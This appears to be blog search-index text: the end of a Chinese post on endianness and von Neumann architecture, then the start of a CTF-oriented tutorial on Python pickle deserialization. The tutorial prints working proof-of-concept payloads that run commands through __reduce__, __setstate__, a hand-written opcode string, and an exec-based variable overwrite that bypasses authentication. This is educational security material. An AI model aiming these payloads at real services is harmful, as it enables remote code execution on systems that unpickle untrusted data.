小端序是从右到左排列，个位数在第一位。所以，只要读取第一位，就能确定它是偶数。 9.4 检查正负号 一个类似的场景是检查正负号，确定一个数是正数还是负数。 大端序的符号位在左边第一位，小端序的符号位在右边最后一位。所以，大端序有优势，只看第一位就能知道是不是负数。 9.5 比较大小 下一个操作是比较大小。现在有三个数字，需要比较大小：43662576，594，2。 上图是大端序排列，因为是从左到右排列，所以三个数字在右边个位数对齐。比较大小时，计算机就不得不读取每一个数的所有位，直到个位数，再进行比较。 如果改成小端序，就是下面的排列方式。 小端序是从右到左，所以三个数字在第一位对齐。计算机就不需要读取所有位，哪个数字先读不到下一位，就是最小的。比如，2这个数字就没有第二位，所以读到第二位时，就知道它是最小的。 所以，比较大小时，小端序有优势。 9.6 乘法 接下来，再看乘法操作。 乘法是逐位相乘，每一轮乘法都要向前进位。 上图是大端序的24165乘以3841。大端序的乘法是向左进位，也就是向左边扩展，必须等到每一轮的结果都出来（上例是四轮），再相加统一写入内存。 如果改成小端序的乘法，就不需要等待下一轮的结果，每一轮都可以直接写入内存。 上图是小端序的24165乘以3841。小端序的乘法是向右进位，也就是向右边扩展，左边的边界不变。每一轮结果写入内存后，就不需要移动，后面有变化只需要改动对应的位就行了。 因此，小端序的乘法有明显优势。 9.7 任意精度整数 上一个例子的从低位开始计算的特性，对于任意精度整数特别有用。任意精度整数又称大整数，可以存放任意大小的整数。 它的内部实现是把整数分成一个个较小的单位，通常是 uint32（无符号32位整数）或 uint64（无符号64位整数），按顺序组合在一起。 如果是大端序，第一个 u64 就是这个整数最大的部分。运算时，一旦这个数发生变化，需要进位，后面的所有位都必须移动和改写。小端序发生进位时，往往就不需要所有位移动。 小端序的另一个好处是，如果逐字节的运算从个位数开始（比如乘法和加法），可以从左到右依次运算一个个 u64，算完上一个再读取下一个。大端序就不行，必须读取整个数以后再进行运算。 9.8 更改类型 最后一个例子是，C 语言有一种 cast 操作，可以强制改变变量的数据类型，比如把32位整数强行改变为16位整数。 上图中，32位整数0x00000001更改为16位整数0x0001，大端序是截去前面两个字节，这时指向这个地址的指针必须向后移动两个字节。 小端序就没有这个问题，截去的是后面两个字节，第一位的地址是不变的，所以指针不需要移动。 9.9 总结 综上所述，大端序和小端序各自的优势如下。 如果需要逐位运算，或者需要到从个位数开始运算，都是小端序占优势。反之，如果运算只涉及到高位，或者数据的可读性比较重要，则是大端序占优势。 0x10 总结 汇编指令是机器指令的助记符，与机器指令是一一对应的 AT&amp;T的汇编语法格式和Intel汇编语法格式的是不同的 常用寄存器：EAX 、EBX、ECX、EDX、EDI、ESI、EBP、ESP 存取速度从高到低分别是: 寄存器 &gt; 1级缓存 &gt; 2级缓存 &gt; 3级缓存 &gt; 内存 &gt; 硬盘 常用的汇编指令：mov、je、jmp、call、add、sub、inc、dec、and、or 0x11 冯诺依曼结构体系 11.1 计算机的基本硬件组成 早年，要自己组装一台计算机，要先有三大件，CPU、内存和主板。 在这三大件中，我们首先要说的是CPU，它是计算机最重要的核心配件，全名你肯定知道，叫中央处理器（Central Processing Unit）。为什么说 CPU 是“最重要”的呢？因为计算机的所有“计算”都是由 CPU 来进行的。自然，CPU 也是整台计算机中造价最昂贵的部分之一。 CPU 是一个超级精细的印刷电路版，图片来源 第二个重要的配件，就是内存（Memory）。你撰写的程序、打开的浏览器、运行的游戏，都要加载到内存里才能运行。程序读取的数据、计算得到的结果，也都要放在内存里。内存越大，能加载的东西自然也就越多。 内存通常直接可以插在主板上，图片来源 存放在内存里的程序和数据，需要被 CPU 读取，CPU 计算完之后，还要把数据写回到内存。然而 CPU 不能直接插到内存上，反之亦然。于是，就带来了最后一个大件——主板（Motherboard）。 主板是一个有着各种各样，有时候多达数十乃至上百个插槽的配件。我们的 CPU 要插在主板上，内存也要插在主板上。主板的芯片组（Chipset）和总线（Bus）解决了 CPU 和内存之间如何通信的问题。芯片组控制了数据传输的流转，也就是数据从哪里到哪里的问题。总线则是实际数据传输的高速公路。因此，总线速度（Bus Speed）决定了数据能传输得多快。 计算机主板上通常有着各种各样的插槽，图片来源 有了三大件，只要配上电源供电，计算机差不多就可以跑起来了。但是现在还缺少各类输入（Input）/ 输出（Output）设备，也就是我们常说的I/O 设备。如果你用的是自己的个人电脑，那显示器肯定必不可少，只有有了显示器我们才能看到计算机输出的各种图像、文字，这也就是所谓的输出设备。 同样的，鼠标和键盘也都是必不可少的配件。这样我才能输入文本，写下这篇文章。它们也就是所谓的输入设备。 最后，你自己配的个人计算机，还要配上一个硬盘。这样各种数据才能持久地保存下来。绝大部分人都会给自己的机器装上一个机箱，配上风扇，解决灰尘和散热的问题。不过机箱和风扇，算不上是计算机的必备硬件，我们拿个纸板或者外面放个电风扇，也一样能用。 说了这么多，其实你应该有感觉了，显示器、鼠标、键盘和硬盘这些东西并不是一台计算机必须的部分。你想一想，我们其实只需要有 I/O 设备，能让我们从计算机里输入和输出信息，是不是就可以了？答案当然是肯定的。 你肯定去过网吧吧？不知道你注意到没有，很多网吧的计算机就没有硬盘，而是直接通过局域网，读写远程网络硬盘里面的数据。我们日常用的各类云服务器，只要让计算机能通过网络，SSH 远程登陆访问就好了，因此也没必要配显示器、鼠标、键盘这些东西。这样不仅能够节约成本，还更方便维护。 还有一个很特殊的设备，就是显卡（Graphics Card）。现在，使用图形界面操作系统的计算机，无论是 Windows、Mac OS 还是 Linux，显卡都是必不可少的。有人可能要说了，我装机的时候没有买显卡，计算机一样可以正常跑起来啊！那是因为，现在的主板都带了内置的显卡。如果你用计算机玩游戏，做图形渲染或者跑深度学习应用，你多半就需要买一张单独的显卡，插在主板上。显卡之所以特殊，是因为显卡里有除了 CPU 之外的另一个“处理器”，也就是GPU（Graphics Processing Unit，图形处理器），GPU 一样可以做各种“计算”的工作。 鼠标、键盘以及硬盘，这些都是插在主板上的。作为外部 I/O 设备，它们是通过主板上的南桥（SouthBridge）芯片组，来控制和 CPU 之间的通信的。“南桥”芯片的名字很直观，一方面，它在主板上的位置，通常在主板的“南面”。另一方面，它的作用就是作为“桥”，来连接鼠标、键盘以及硬盘这些外部设备和 CPU 之间的通信。 有了南桥，自然对应着也有“北桥”。是的，以前的主板上通常也有“北桥”芯片，用来作为“桥”，连接 CPU 和内存、显卡之间的通信。不过，随着时间的变迁，现在的主板上的“北桥”芯片的工作，已经被移到了 CPU 的内部，所以你在主板上，已经看不到北桥芯片了。 11.2 冯·诺依曼体系结构 刚才我们讲了一台计算机的硬件组成，这说的是我们平时用的个人电脑或者服务器。那我们平时最常用的智能手机的组成，也是这样吗？ 我们手机里只有 SD 卡（Secure Digital Memory Card）这样类似硬盘功能的存储卡插槽，并没有内存插槽、CPU 插槽这些东西。没错，因为手机尺寸的原因，手机制造商们选择把 CPU、内存、网络通信，乃至摄像头芯片，都封装到一个芯片，然后再嵌入到手机主板上。这种方式叫SoC，也就是 System on a Chip（系统芯片）。 这样看起来，个人电脑和智能手机的硬件组成方式不太一样。可是，我们写智能手机上的 App，和写个人电脑的客户端应用似乎没有什么差别，都是通过“高级语言”这样的编程语言撰写、编译之后，一样是把代码和数据加载到内存里来执行。这是为什么呢？因为，无论是个人电脑、服务器、智能手机，还是 Raspberry Pi 这样的微型卡片机，都遵循着同一个“计算机”的抽象概念。这是怎么样一个“计算机”呢？这其实就是，计算机祖师爷之一冯·诺依曼（John von Neumann）提出的冯·诺依曼体系结构（Von Neumann architecture），也叫存储程序计算机。 什么是存储程序计算机呢？这里面其实暗含了两个概念，一个是“可编程”计算机，一个是“存储”计算机。 说到“可编程”，估计你会有点懵，你可以先想想，什么是“不可编程”。计算机是由各种门电路组合而成的，然后通过组装出一个固定的电路版，来完成一个特定的计算程序。一旦需要修改功能，就要重新组装电路。这样的话，计算机就是“不可编程”的，因为程序在计算机硬件层面是“写死”的。最常见的就是老式计算器，电路板设好了加减乘除，做不了任何计算逻辑固定之外的事情。 计算器的本质是一个不可编程的计算机，图片来源 我们再来看“存储”计算机。这其实是说，程序本身是存储在计算机的内存里，可以通过加载不同的程序来解决不同的问题。有“存储程序计算机”，自然也有不能存储程序的计算机。典型的就是早年的“Plugboard”这样的插线板式的计算机。整个计算机就是一个巨大的插线板，通过在板子上不同的插头或者接口的位置插入线路，来实现不同的功能。这样的计算机自然是“可编程”的，但是编写好的程序不能存储下来供下一次加载使用，不得不每次要用到和当前不同的“程序”的时候，重新插板子，重新“编程”。 著名的Engima Machine就用到了 Plugboard 来进行“编程”，图片来源 可以看到，无论是“不可编程”还是“不可存储”，都会让使用计算机的效率大大下降。而这个对于效率的追求，也就是“存储程序计算机”的由来。 于是我们的冯祖师爷，基于当时在秘密开发的 EDVAC 写了一篇报告First Draft of a Report on the EDVAC，描述了他心目中的一台计算机应该长什么样。这篇报告在历史上有个很特殊的简称，叫First Draft，翻译成中文，其实就是《第一份草案》。这样，现代计算机的发展就从祖师爷写的一份草案开始了。 First Draft里面说了一台计算机应该有哪些部分组成，我们一起来看看。 首先是一个包含算术逻辑单元（Arithmetic Logic Unit，ALU）和处理器寄存器（Processor Register）的处理器单元（Processing Unit），用来完成各种算术和逻辑运算。因为它能够完成各种数据的处理或者计算工作，因此也有人把这个叫作数据通路（Datapath）或者运算器。 然后是一个包含指令寄存器（Instruction Reigster）和程序计数器（Program Counter）的控制器单元（Control Unit/CU），用来控制程序的流程，通常就是不同条件下的分支和跳转。在现在的计算机里，上面的算术逻辑单元和这里的控制器单元，共同组成了我们说的 CPU。 接着是用来存储数据（Data）和指令（Instruction）的内存。以及更大容量的外部存储，在过去，可能是磁带、磁鼓这样的设备，现在通常就是硬盘。 最后就是各种输入和输出设备，以及对应的输入和输出机制。我们现在无论是使用什么样的计算机，其实都是和输入输出设备在打交道。个人电脑的鼠标键盘是输入设备，显示器是输出设备。我们用的智能手机，触摸屏既是输入设备，又是输出设备。而跑在各种云上的服务器，则是通过网络来进行输入和输出。这个时候，网卡既是输入设备又是输出设备。 任何一台计算机的任何一个部件都可以归到运算器、控制器、存储器、输入设备和输出设备中，而所有的现代计算机也都是基于这个基础架构来设计开发的。 而所有的计算机程序，也都可以抽象为从输入设备读取输入信息，通过运算器和控制器来执行存储在存储器里的程序，最终把结果输出到输出设备中。而我们所有撰写的无论高级还是低级语言的程序，也都是基于这样一个抽象框架来进行运作的。 冯·诺依曼体系结构示意图，图片来源 冯·诺依曼架构（Von Neumann Architecture） 是冯·诺依曼和其他人提出的电子计算机通用架构。冯·诺依曼架构将通用计算机定义为以下 3 个基本原则： 1、采用二进制： 指令和数据均采用二进制格式； 2、存储程序： 一个计算机程序，不可能只有一条指令，而是由成千上万条指令组成的。指令和数据均存储在存储器中，而不是早期的插线板中，计算机按需从存储器中取指令和取数据； 3、计算机由 5 个硬件组成： 运算器、控制器、存储器、输入设备和输出设备。在最开始的计算机中，五个部件是围绕着运算器运转的，这使得存储器和 I/O 设备之间的数据传送也需要经过运算器。 而现代计算机中，五个部件是围绕着存储器运转的，这使得存储器和 I/O 设备可以直接完成数据传送，而不需要经过 CPU。 在冯·诺依曼架构之前还有一个哈佛架构，现在说的比较少。两者的区别在于冯·诺依曼是将指令和数据存储在同一个存储器的不同位置，存在争用问题；而哈弗架构将指令和数据存储在不同存储器中，规避了争用问题，与 CPU L1 缓存将指令和数据分离的思想类似。 12.2 冯·诺依曼瓶颈 冯·诺依曼瓶颈的概念最早由 John Backus 在 1977 年的图灵奖领奖演讲中提出： 由于 CPU 和存储器之间共享同一个系统总线，并且 CPU 和存储器之间存在巨大的速度差，导致 CPU 需要不断地被迫等待数据读取或写入到存储器，因此遏制了 CPU 的吞吐量 要从根本上解决冯·诺依曼瓶颈，还是只能重新构建一套新的计算机体系，例如生物计算机、量子计算机。不过，目前它们都还处在非常原始的阶段。现代计算机体系只能采用优化策略来减弱冯·诺依曼瓶颈的影响。 12.3 总结 如果说图灵机描述的是计算机的抽象模型，那么冯·诺依曼架构则是对图灵机这个抽象模型的实现架构。 冯诺依曼架构确立了现代电子计算机的基础和结构，学习计算机组成原理，其实就是学习和拆解冯诺依曼架构。 0x12 参考文章 字长与端序 字节序探析：大端与小端的比较 汇编指令入门级整理 汇编语言入门教程 汇编基础之三 – 汇编指令 01 冯·诺依曼体系结构：计算机组成的金字塔 一套用了 70 年的计算机架构 —— 冯·诺依曼架构","tags":["reverse系列"],"categories":["reverse"]},{"title":"Pickle反序列化","path":"/2023/11/14/pickle-fan-xu-lie-hua-xue-xi/","content":"0x01 前言 之前学的反序列化一直是围绕PHP的，近期刷题也遇到pickle反序列化，故此学习一番，唉，Python反序列化都难，更别说Java了┭┮﹏┭┮ 0x02 简介 Python的序列化和反序列化是将一个类对象向字节流转化从而进行存储和传输, 然后使用的时候再将字节流转化回原始的对象的一个过程, 这个和其他语言的序列化与反序列化其实都差不多. Python中序列化一般有两种方式: pickle模块和json模块, 前者是Python特有的格式, 后者是json通用的格式. 相较于PHP反序列化灵活多样的利用方式, 例如POP链构造, Phar反序列化, 原生类反序列化以及字符逃逸等. Python相对而言没有PHP那么灵活, 关于反序列化漏洞主要涉及这么几个概念: pickle, pvm, __reduce__魔术方法。 0x03 Pickle 3.1 基础知识 Pickle可以用于Python特有的类型和Python的数据类型间进行转换(所有Python数据类型). Python提供两个模块来实现序列化: cPickle和pickle. 这两个模块功能是一样的, 区别在于cPickle是C语言写的, 速度快; pickle是纯Python写的, 速度慢. 在Python3中已经没有cPickle模块. pickle有如下四种操作方法: 函数 说明 dump 对象序列化到文件对象并存入文件 dumps 对象序列化为 bytes 对象（字符串格式的字节流） load 对象反序列化并从文件中读取数据 loads 从 bytes 对象（字符串格式的字节流）反序列化 pickle.dump(*obj*, *file*, *protocol=None*, ***, *fix_imports=True*) 将打包好的对象 obj 写入文件中，其中protocol为pickling的协议版本（下同）。 pickle.dumps(*obj*, *protocol=None*, ***, *fix_imports=True*) 将 obj 打包以后的对象作为bytes类型直接返回。 pickle.load(*file*, ***, *fix_imports=True*, *encoding=\"ASCII\"*, *errors=\"strict\"*) 从文件中读取二进制字节流，将其反序列化为一个对象并返回。 pickle.loads(*data*, ***, *fix_imports=True*, *encoding=\"ASCII\"*, *errors=\"strict\"*) 从data中读取二进制字节流，将其反序列化为一个对象并返回。 object.__reduce__() __reduce__()其实是object类中的一个魔术方法，我们可以通过重写类的 object.__reduce__() 函数，使之在被实例化时按照重写的方式进行。 Python要求该方法必须返回一个字符串或者元组。如果返回元组(callable, ([para1,para2...])[,...]) ，那么每当该类的对象被反序列化时，该callable就会被调用，参数为para1、para2... 这里在强调一下这个基础知识： 与PHP类似，python也有序列化功能以长期储存内存中的数据。pickle是python下的序列化与反序列化包。 python有另一个更原始的序列化包marshal，现在开发时一般使用pickle。 与json相比，pickle以二进制储存，不易人工阅读；json可以跨语言，而pickle是Python专用的；pickle能表示python几乎所有的类型（包括自定义类型），json只能表示一部分内置类型且不能表示自定义类型。 pickle实际上可以看作一种独立的语言，通过对opcode的更改编写可以执行python代码、覆盖变量等操作。直接编写的opcode灵活性比使用pickle序列化生成的代码更高，有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）。 3.2 可序列化的对象 None 、 True 和 False 整数、浮点数、复数 str、byte、bytearray 只包含可封存对象的集合，包括 tuple、list、set 和 dict 定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以） 定义在模块最外层的内置函数 定义在模块最外层的类 __dict__ 属性值或 __getstate__() 函数的返回值可以被序列化的类（详见官方文档的Pickling Class Instances） 3.3 object.__reduce__() 函数 在开发时，可以通过重写类的 object.__reduce__() 函数，使之在被实例化时按照重写的方式进行。具体而言，python要求 object.__reduce__() 返回一个 (callable, ([para1,para2...])[,...]) 的元组，每当该类的对象被unpickle时，该callable就会被调用以生成对象（该callable其实是构造函数）。 在下文pickle的opcode中， R 的作用与 object.__reduce__() 关系密切：选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数。其实 R 正好对应 object.__reduce__() 函数， object.__reduce__() 的返回值会作为 R 的作用对象，当包含该函数的对象被pickle序列化时，得到的字符串是包含了 R 的。 3.4 魔术方法 __reduce__() 反序列化时调用 __reduce_ex__() 反序列化时调用 //上面的升级版 __setstate__() 反序列化时调用 __getstate__() 序列化时调用 这里用一个小迪的Demo来体会一下上述魔术方法的作用 __reduce__() import pickle import os #反序列化魔术方法调用-__reduce__() __reduce_ex__() __setstate__() class A(object): def __reduce__(self): print('反序列化调用') return (os.system,('calc',)) a = A() p_a = pickle.dumps(a) pickle.loads(p_a) print('==========') print(p_a) 上述先实例化一个a对象，接着对a对象进行dumps序列化，然后loads对a序列化后的字节流数据进行反序列化，最后打印出a序列化后的字节流数据。 注意这里的__reduce__魔术方法在反序列化时（也就是调用loads函数时）会被自动调用，随后打印一段字符，接着调用system执行calc命令，结果如下图。 我们将上述loads注释掉，会发现没有调用计算器，但却执行了reduce中的print函数，这里我就懵逼了，不是说只有loads反序列化时才会调用reduce方法吗。接着问了一下GPT发现： 在进行pickle.dumps时，会尝试调用reduce方法以获取序列化信息，因此会执行print函数。但在此阶段，其并不会执行返回的可调用对象和其他参数，只是单纯的获取这些信息用于后续的反序列化操作。 这里有一个注意点，就是reduce的return部分，是必须要返回一个字符串或者是元组的，否则就会报错，如下图 不过一个懵逼的点是，我将上述os.system后面的逗号去掉之后，虽然报错，但依旧执行了calc命令。。。暂不清楚原因。 __setstate__() import pickle import os class SerializePerson(): # 构造函数的定义 def __init__(self, name): self.name = name # 构造 __setstate__ 方法 def __setstate__(self, name): os.system('calc') # 恶意代码 tmp = pickle.dumps(SerializePerson('tom')) #序列化 pickle.loads(tmp) # 反序列化 此时会弹出计算器 这里在反序列化时会自动调用__setstate__魔术方法，进而执行calc命令，如下图成功验证，但此函数的优先级低于reduce，且是静态方法。 __getstate__() import pickle import os #序列化魔术方法调用-__getstate__ class A(object): def __getstate__(self): print('序列化调用') os.system('calc') a = A() p_a = pickle.dumps(a) print('==========') print(p_a) 该函数会在序列化时自动调用，如下图成功验证 3.5 简单使用 3.5.1 序列化操作 代码： import pickle class Demo(): def init(self, name='h3rmesk1t'): self.name = name print(pickle.dumps(Demo())) 在Python2与Python3下的运行结果如上图所示 输出的一大串字符实际上是一串PVM操作码，可以在pickle.py中看到关于这些操作码的详解. 3.5.2 反序列化操作 import pickle class Demo(): def __init__(self, name='h3rmesk1t'): self.name = name print('[+] 序列化') print(pickle.dumps(Demo())) print('[+] 反序列化') print(pickle.loads(pickle.dumps(Demo())).name) 0x04 Pickle过程详细解读 pickle解析依靠Pickle Virtual Machine (PVM)进行。 PVM涉及到三个部分：1. 解析引擎 2. 栈 3. 内存： 解析引擎：从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 . 停止。最终留在栈顶的值将被作为反序列化对象返回。 栈：由Python的list实现，被用来临时存储数据、参数以及对象。 memo：由Python的dict实现，为PVM的生命周期提供存储。说人话：将反序列化完成的数据以 key-value 的形式储存在memo中，以便后来使用。 为了便于理解，hachp1师傅把BH讲稿中的相关部分制成了动图，PVM解析 str 的过程动图： PVM解析 __reduce__() 的过程动图： 4.1 执行流程 首先, PVM会把源代码编译成字节码, 字节码是Python语言特有的一种表现形式, 它不是二进制机器码, 需要进一步编译才能被机器执行. 如果Python进程在主机上有写入权限, 那么它会把程序字节码保存为一个以.pyc为扩展名的文件. 如果没有写入权限, 则Python进程会在内存中生成字节码, 在程序执行结束后被自动丢弃. 一般来说, 在构建程序时最好给Python进程在主机上的写入权限, 这样只要源代码没有改变, 生成的.pyc文件就可以被重复利用, 提高执行效率, 同时隐藏源代码. 然后, Python进程会把编译好的字节码转发到PVM(Python虚拟机)中, PVM会循环迭代执行字节码指令, 直到所有操作被完成. 4.2 opcode简介 pickle由于有不同的实现版本，在py3和py2中得到的opcode不相同。但是pickle可以向下兼容（所以用v0就可以在所有版本中执行）。目前，pickle有6种版本。 import pickle a={'1': 1, '2': 2} print(f'# 原变量：{a!r}')# 输出a的值 for i in range(4): print(f'pickle版本{i}',pickle.dumps(a,protocol=i)) # 输出： # 原变量:{'1': 1, '2': 2} Pcike版本0 b'(dp0 V1 p1 I1 sV2 p2 I2 s.' Pcike版本1 b'}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' Pcike版本2 b'\\x80\\x02}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' Pcike版本3 b'\\x80\\x03}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' pickle3版本的opcode示例： # 'abcd' b'\\x80\\x03X\\x04\\x00\\x00\\x00abcdq\\x00.' # \\x80：协议头声明 # \\x03：协议版本 # \\x04\\x00\\x00\\x00：数据长度：4 # abcd：数据 # q：储存栈顶的字符串长度：一个字节（即\\x00） # \\x00：栈顶位置 # .：数据截止 pickle0版本的部分opcode表格： Opcode Mnemonic Data type loaded onto the stack Example S STRING String S’foo’ V UNICODE Unicode Vfo\\u006f I INTEGER Integer I42 … … … … 本表格截取了BH的pdf上的部分内容，完整表格可以直接在原pdf中找到。 4.3 指令集 当前用于pickling的协议共有6种, 使用的协议版本越高, 读取生成的pickle所需的Python版本就要越新. v0版协议是原始的\"人类可读\"协议, 并且向后兼容早期版本的Python. v1版协议是较早的二进制格式, 它也与早期版本的Python兼容. v2版协议是在Python 2.3中引入的, 它为存储new-style class提供了更高效的机制, 参阅PEP 307. v3版协议添加于Python 3.0, 它具有对bytes对象的显式支持, 且无法被Python 2.x打开, 这是目前默认使用的协议, 也是在要求与其他Python 3版本兼容时的推荐协议. v4版协议添加于Python 3.4, 它支持存储非常大的对象, 能存储更多种类的对象, 还包括一些针对数据格式的优化, 参阅PEP 3154. v5版协议添加于Python 3.8, 它支持带外数据, 加速带内数据处理. # Pickle opcodes. See pickletools.py for extensive docs. The listing # here is in kind-of alphabetical order of 1-character pickle code. # pickletools groups them by purpose. MARK = b'(' # push special markobject on stack STOP = b'.' # every pickle ends with STOP POP = b'0' # discard topmost stack item POP_MARK = b'1' # discard stack top through topmost markobject DUP = b'2' # duplicate top stack item FLOAT = b'F' # push float object; decimal string argument INT = b'I' # push integer or bool; decimal string argument BININT = b'J' # push four-byte signed int BININT1 = b'K' # push 1-byte unsigned int LONG = b'L' # push long; decimal string argument BININT2 = b'M' # push 2-byte unsigned int NONE = b'N' # push None PERSID = b'P' # push persistent object; id is taken from string arg BINPERSID = b'Q' # \" \" \" ; \" \" \" \" stack REDUCE = b'R' # apply callable to argtuple, both on stack STRING = b'S' # push string; NL-terminated string argument BINSTRING = b'T' # push string; counted binary string argument SHORT_BINSTRING= b'U' # \" \" ; \" \" \" \" &lt; 256 bytes UNICODE = b'V' # push Unicode string; raw-unicode-escaped'd argument BINUNICODE = b'X' # \" \" \" ; counted UTF-8 string argument APPEND = b'a' # append stack top to list below it BUILD = b'b' # call __setstate__ or __dict__.update() GLOBAL = b'c' # push self.find_class(modname, name); 2 string args DICT = b'd' # build a dict from stack items EMPTY_DICT = b'}' # push empty dict APPENDS = b'e' # extend list on stack by topmost stack slice GET = b'g' # push item from memo on stack; index is string arg BINGET = b'h' # \" \" \" \" \" \" ; \" \" 1-byte arg INST = b'i' # build &amp; push class instance LONG_BINGET = b'j' # push item from memo on stack; index is 4-byte arg LIST = b'l' # build list from topmost stack items EMPTY_LIST = b']' # push empty list OBJ = b'o' # build &amp; push class instance PUT = b'p' # store stack top in memo; index is string arg BINPUT = b'q' # \" \" \" \" \" ; \" \" 1-byte arg LONG_BINPUT = b'r' # \" \" \" \" \" ; \" \" 4-byte arg SETITEM = b's' # add key+value pair to dict TUPLE = b't' # build tuple from topmost stack items EMPTY_TUPLE = b')' # push empty tuple SETITEMS = b'u' # modify dict by adding topmost key+value pairs BINFLOAT = b'G' # push float; arg is 8-byte float encoding TRUE = b'I01 ' # not an opcode; see INT docs in pickletools.py FALSE = b'I00 ' # not an opcode; see INT docs in pickletools.py # Protocol 2 PROTO = b'\\x80' # identify pickle protocol NEWOBJ = b'\\x81' # build object by applying cls.__new__ to argtuple EXT1 = b'\\x82' # push object from extension registry; 1-byte index EXT2 = b'\\x83' # ditto, but 2-byte index EXT4 = b'\\x84' # ditto, but 4-byte index TUPLE1 = b'\\x85' # build 1-tuple from stack top TUPLE2 = b'\\x86' # build 2-tuple from two topmost stack items TUPLE3 = b'\\x87' # build 3-tuple from three topmost stack items NEWTRUE = b'\\x88' # push True NEWFALSE = b'\\x89' # push False LONG1 = b'\\x8a' # push long from &lt; 256 bytes LONG4 = b'\\x8b' # push really big long _tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3] # Protocol 3 (Python 3.x) BINBYTES = b'B' # push bytes; counted binary string argument SHORT_BINBYTES = b'C' # \" \" ; \" \" \" \" &lt; 256 bytes # Protocol 4 SHORT_BINUNICODE = b'\\x8c' # push short string; UTF-8 length &lt; 256 bytes BINUNICODE8 = b'\\x8d' # push very long string BINBYTES8 = b'\\x8e' # push very long bytes string EMPTY_SET = b'\\x8f' # push empty set on the stack ADDITEMS = b'\\x90' # modify set by adding topmost stack items FROZENSET = b'\\x91' # build frozenset from topmost stack items NEWOBJ_EX = b'\\x92' # like NEWOBJ but work with keyword only arguments STACK_GLOBAL = b'\\x93' # same as GLOBAL but using names on the stacks MEMOIZE = b'\\x94' # store top of the stack in memo FRAME = b'\\x95' # indicate the beginning of a new frame # Protocol 5 BYTEARRAY8 = b'\\x96' # push bytearray NEXT_BUFFER = b'\\x97' # push next out-of-band buffer READONLY_BUFFER = b'\\x98' # make top of stack readonly 上文谈到了opcode是有多个版本的, 在进行序列化时可以通过protocol=num来选择opcode的版本, 指定的版本必须小于等于5. 4.4 Pickletools 使用pickletools可以方便的将opcode转化为便于肉眼读取的形式 import pickletools data=b\"\\x80\\x03cbuiltins exec q\\x00X\\x13\\x00\\x00\\x00key1=b'1' key2=b'2'q\\x01\\x85q\\x02Rq\\x03.\" pickletools.dis(data) 0: \\x80 PROTO 3 2: c GLOBAL 'builtins exec' 17: q BINPUT 0 19: X BINUNICODE \"key1=b'1' key2=b'2'\" 43: q BINPUT 1 45: \\x85 TUPLE1 46: q BINPUT 2 48: R REDUCE 49: q BINPUT 3 51: . STOP highest protocol among opcodes = 2 4.5 例子-文字说明 这里翻到其他文章采用了文字叙述的方式介绍了一个简单的opcode例子： 这里用一段简短的字节码来演示利用过程: cos system (S'whoami' tR. 上文中的字节码其实就是__import__('os').system(*('whoami',)), 下面来分解分析一下: cos =&gt; 引入模块 os. system =&gt; 引用 system, 并将其添加到 stack. (S'whoami' =&gt; 把当前 stack 存到 metastack, 清空 stack, 再将 'whoami' 压入 stack. t =&gt; stack 中的值弹出并转为 tuple, 把 metastack 还原到 stack, 再将 tuple 压入 stack. R =&gt; system(*('whoami',)). . =&gt; 结束并返回当前栈顶元素. 需要注意的是, 并不是所有的对象都能使用pickle进行序列化和反序列化, 例如文件对象和网络套接字对象以及代码对象就不可以. 0x05 漏洞利用 5.1 漏洞原理 漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化，反序列化后产生的对象会在结束时触发__reduce__()函数从而触发恶意代码. 简单来说, __reduce__()魔术方法类似于PHP中的__wakeup()方法, 在反序列化时会先调用__reduce__()魔术方法. 1.如果返回值是一个字符串, 那么将会去当前作用域中查找字符串值对应名字的对象, 将其序列化之后返回. 2.如果返回值是一个元组, 要求是2到6个参数(Python3.8新加入元组的第六项). i.第一个参数是可调用的对象. ii.第二个是该对象所需的参数元组, 如果可调用对象不接受参数则必须提供一个空元组. iii.第三个是用于表示对象的状态的可选元素, 将被传给前述的__setstate__()方法, 如果对象没有此方法, 则这个元素必须是字典类型并会被添加至__dict__属性中. iv.第四个是用于返回连续项的迭代器的可选元素. v.第五个是用于返回连续键值对的迭代器的可选元素. vi.第六个是一个带有(obj, state)签名的可调用对象的可选元素. 这里依旧展示一下小迪的Demo，浅浅了解Python反序列化漏洞的为何会产生 import pickle import os #反序列化安全漏洞产生-DEMO class A(object): # 定义构造函数，将传入的参数进行了赋值 def __init__(self, func, arg): self.func = func self.arg = arg print('This is A') # 定义reduce方法，这里将传入的参数分别当做了函数及参数 def __reduce__(self): print('反序列化调用') return (self.func, self.arg) a = A(os.system, ('calc',)) p_a = pickle.dumps(a) pickle.loads(p_a) print('==========') print(p_a) 很明显如果我们此时运行程序的话，就会执行calc命令，这也就是说我们可以传入一些带恶意数据的序列化字符串，将其传入到某个具有反序列化功能的点，那就会执行我们的恶意数据，可以进一步开展后续工作了。 5.2 利用思路 任意代码执行或命令执行。 变量覆盖，通过覆盖一些凭证达到绕过身份验证的目的。 5.3 初步认识：pickle EXP的简单demo import pickle import os class genpoc(object): def __reduce__(self): s = \"\"\"echo test &gt;poc.txt\"\"\" # 要执行的命令 return os.system, (s,) # reduce函数必须返回元组或字符串 e = genpoc() poc = pickle.dumps(e) print(poc) # 此时，如果 pickle.loads(poc)，就会执行命令 变量覆盖 import pickle key1 = b'321' key2 = b'123' class A(object): def __reduce__(self): return (exec,(\"key1=b'1' key2=b'2'\",)) a = A() pickle_a = pickle.dumps(a) print(pickle_a) pickle.loads(pickle_a) print(key1, key2) 输出： b\"\\x80\\x04\\x95/\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x08builtins\\x94\\x8c\\x04exec\\x94\\x93\\x94\\x8c\\x13key1=b'1' key2=b'2'\\x94\\x85\\x94R\\x94.\" b'1' b'2' 5.4 如何手写opcode 在CTF中，很多时候需要一次执行多个函数或一次进行多个指令，此时就不能光用 __reduce__ 来解决问题（reduce一次只能执行一个函数，当exec被禁用时，就不能一次执行多条指令了），而需要手动拼接或构造opcode了。手写opcode是pickle反序列化比较难的地方。 